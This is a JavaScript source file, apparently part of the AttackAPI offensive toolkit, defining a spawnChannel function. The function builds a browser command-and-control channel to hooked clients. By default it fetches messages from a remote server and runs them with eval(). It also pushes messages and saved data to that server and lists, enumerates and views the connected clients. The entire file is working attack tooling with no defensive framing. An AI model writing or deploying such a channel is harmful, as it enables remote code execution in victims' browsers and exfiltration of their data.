
AttackAPI.dom.spawnChannel = function (channel) {
	if (AttackAPI.dom.spawnChannel.channels == undefined)
		AttackAPI.dom.spawnChannel.channels = new Array();
	
	var channel = AttackAPI.core.clone(channel);
	channel.index = AttackAPI.dom.spawnChannel.channels.length;
	channel.referrer = channel.referrer?channel.referrer:document.location;
	
	function transport(query) {
		AttackAPI.core.extend(query, {
			referrer: channel.referrer,
			__r: Math.random() + '_' + new Date().getTime()});
			
		AttackAPI.dom.transport({url: channel.location, query: query});
	}
	
	function evaluate(query) {
		AttackAPI.core.extend(query, {
			referrer: channel.referrer,
			__r: Math.random() + '_' + new Date().getTime()});
			
		AttackAPI.dom.requestJSL(channel.location + '?' + AttackAPI.utils.buildQuery(query));		
	}
	
	function prepareList(obj) {
		if (obj.join)
			return obj.join(',');
			
		return obj;
	}
	
	if (typeof(channel.onpull) != 'function')
		channel.onpull = function (message) {
			eval(message);
		};
		
	channel.pull = function () {
		evaluate({
			action: 'pull',
			callback: 'AttackAPI.dom.spawnChannel.channels[' + channel.index + '].onpull'});
		
		return true;
	};
	
	channel.push = function (message, client, target) {
		if (typeof(channel.onpush) == 'function' && !channel.onpush(message, client, target))
			return false;
			
		transport({
			action: 'push',
			message: message,
			target: target?target:'_',
			client: prepareList(client?client:'self')});
		
		return true;
	};
	
	channel.list = function () {
		if (typeof(channel.onlist) == 'undefined')
			return false;
			
		evaluate({
			action: 'list',
			callback: 'AttackAPI.dom.spawnChannel.channels[' + channel.index + '].onlist'});
		
		return true;
	};
	
	channel.enumerate = function () {
		if (typeof(channel.onenumerate) == 'undefined')
			return false;
			
		evaluate({
			action: 'enum',
			callback: 'AttackAPI.dom.spawnChannel.channels[' + channel.index + '].onenumerate'});
		
		return true;
	};
	
	channel.view = function (client) {
		if (typeof(channel.onview) == 'undefined')
			return false;
			
		evaluate({
			action: 'view',
			client: prepareList(client?client:'self'),
			callback: 'AttackAPI.dom.spawnChannel.channels[' + channel.index + '].onview'});
		
		return true;
	};
	
	channel.save = function (key, value, client) {
		if (typeof(channel.onsave) && !channel.onsave(key, value, client))
			return false;
			
		transport({
			action: 'save',
			key: key,
			value: value,
			client: prepareList(client?client:'self')});
		
		return true;
	};
	
	channel.init = function () {
		if (typeof(channel.oninit) && !channel.oninit())
			return false;
			
		evaluate({
			action: 'init'});
	};
	
	AttackAPI.dom.spawnChannel.channels.push(channel);
	
	return channel;
};
